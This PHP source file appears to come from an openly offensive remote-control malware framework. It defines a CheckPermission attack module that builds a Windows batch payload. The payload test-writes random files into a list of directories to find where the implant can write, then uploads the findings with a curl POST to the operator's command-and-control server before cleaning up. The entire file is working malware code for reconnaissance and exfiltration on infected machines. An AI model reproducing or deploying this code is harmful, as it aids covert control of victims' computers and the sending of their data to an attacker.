<?php

namespace Kelvinho\Virus\Attack\Packages\Windows\OneTime\CheckPermission;

use Kelvinho\Virus\Attack\AttackBase;
use Kelvinho\Virus\Attack\BaseScript\Windows;
use function Kelvinho\Virus\filter;

/**
 * Class CheckPermission. Checks a bunch of directories to see if the virus can write into them.
 *
 * @package Kelvinho\Virus\Attack\Packages\Windows\OneTime
 * @author Quang Ho <157239q@gmail.com>
 * @copyright Copyright (c) 2020 Quang Ho <https://github.com/157239n>
 * @license http://www.opensource.org/licenses/mit-license.html  MIT License
 */
class CheckPermission extends AttackBase {
    public const PERMISSION_UNSET = -1;
    public const PERMISSION_NOT_ALLOWED = 0;
    public const PERMISSION_ALLOWED = 1;
    public const PERMISSION_DOES_NOT_EXIST = 2;

    private array $directories = [];

    public function setPermissions($blockResult) {
        $lines = filter(explode("\n", $blockResult), function ($line) {
            return !(empty(trim($line)) || trim($line) == ".");
        });
        foreach ($lines as $line) {
            $contents = filter(explode(";", $line), function ($element) {
                return !(empty(trim($element)) && trim($element) != "0");
            });
            $count = (int)$contents[0];
            $perm = (int)$contents[1];
            if ($count < count($this->directories)) {
                $this->directories[$count]["perm"] = $perm;
            }
        }
    }

    public function getDirectoriesAsBlock(): string {
        $block = "";
        foreach ($this->directories as $directory) {
            $block .= $directory["path"] . "\n";
        }
        return $block;
    }

    public function getDirectories(int $permission) {
        return filter($this->directories, function ($directory) use ($permission) {
            return $directory["perm"] == $permission;
        });
    }

    public function setDirectories($blockDirectories) {
        $directories = filter(explode("\n", $blockDirectories), function ($line) {
            return !empty(trim($line));
        });
        $this->directories = [];
        foreach ($directories as $directory) {
            $this->directories[] = array("path" => $directory, "perm" => -1);
        }
    }

    public function generateBatchCode(): void {
        //@formatter:off
        $hash = hash("sha256", rand()); ?>
        SetLocal EnableDelayedExpansion
        chCp 65001
        echo _>"%~pd0perm"
        echo _>"%~pd0temp"
        <?php
        foreach ($this->directories as $index => $value) { $path = $value["path"]; ?>
        if not exist "<?php echo $path; ?>" (echo <?php echo $index; ?>;<?php echo self::PERMISSION_DOES_NOT_EXIST ?>; >> %~pd0perm) else (
            copy "%~pd0temp" "<?php echo $path; ?>\<?php echo $hash; ?>"
            if "!errorLevel!" == "1" (echo <?php echo $index; ?>;<?php echo self::PERMISSION_NOT_ALLOWED; ?>; >> "%~pd0perm") else (
                echo <?php echo $index; ?>;<?php echo self::PERMISSION_ALLOWED; ?>; >> "%~pd0perm"
                del "<?php echo $path; ?>\<?php echo $hash; ?>"
            )
        )
        <?php } ?>
        :end_payload
        <?php echo Windows::payloadConfirmationLoop($this->virus_id, $this->attack_id, $this->generateUploadCode());
        echo Windows::cleanUpPayload();
        //@formatter:on
    }

    private function generateUploadCode(): string {
        ob_start(); ?>
        curl --form "permFile=@%~pd0perm" --post301 --post302 --post303 -L <?php echo ALT_SECURE_DOMAIN . "/vrs/$this->virus_id/aks/$this->attack_id/report"; ?>
        <?php return ob_get_clean();
    }

    public function processExtras(string $resourceIdentifier): void {
    }

    protected function setState(string $json): void {
        $state = json_decode($json, true);
        $this->directories = $state["directories"];
    }

    protected function getState(): string {
        $state = [];
        $state["directories"] = $this->directories;
        return json_encode($state);
    }
}
